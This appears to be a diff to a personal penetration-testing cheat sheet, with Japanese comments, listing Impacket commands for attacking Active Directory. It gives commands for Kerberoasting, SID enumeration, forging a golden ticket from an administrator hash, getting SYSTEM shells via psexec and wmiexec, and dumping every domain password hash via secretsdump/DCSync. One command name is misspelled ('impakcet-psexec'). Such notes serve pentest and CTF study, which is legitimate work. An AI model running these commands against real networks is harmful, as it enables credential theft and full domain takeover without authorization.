@@ -15,12 +15,21 @@ impacket-GetNPUsers <domain>/ -dc-ip <IP> -usersfile user.txt -format hashcat -o
 impacket-GetUserSPNs <domain name>/<user>:<pass> #kerberoastingの対象の列挙
 impacket-GetUserSPNs <domain name>/<user>:<pass> -dc-ip <IP> -request #TGSを入手 -request-user <user> で特定のユーザに絞れる
 
+impacket-lookupsid <user>@<ip> -no-pass #SIDの列挙
+impacket-lookupsid <domain>/<user>@<ip> -domain-sids #ドメイン全員のsid
+
+impacket-ticketer -nthash <hash> -domain-sid <sid> -domain <domain> Administrator #adminのハッシュを用いてゴールデンチケットを偽造
+export KRB5CCNAME=./Administrator.ccache #上記で生成したゴールデンチケットをエクスポート
+
+impakcet-psexec -k -no-pass <domain> #ゴールデンチケットを持っている場合systemのシェルを使える
+impacket-psexec <domain>/<user>:<pass>@<IP> #impacket版psexec　パスを知っている場合
+
 ./secretsdump.py -just-dc-ntlm <user>@<domain> -outputfile <file name> #DCSyncがあるユーザで全員のNTLMをダンプ
 impacket-secretsdump <domain>/<user>:<pass>@<IP> #ドメイン情報からパスワードダンプ
-impacket-psexec <domain>/<user>:<pass>@<IP> #impacket版psexec
+
 impacket-wmiexec <domain>/<user>:'<pass>'@<IP> #wmiを通じて半対話型のシェルをとる。psexecよりステルス。
 impacket-smbclient -k <domain>/<user>:<pass>@<dc name> -dc-ip <IP> #SMBに接続
-impacket-lookupsid <user>@10.129.253.69 -no-pass #SIDの列挙
+
 #impacketで見つけたユーザ名からリストの作成
 grep -oP '(?<=\\).*(?= \()' input.txt > output.txt
 impacket-mssqlclient -windows-auth <domain>/<user>:<pass>@<IP> #mssqlが動いていたら試す
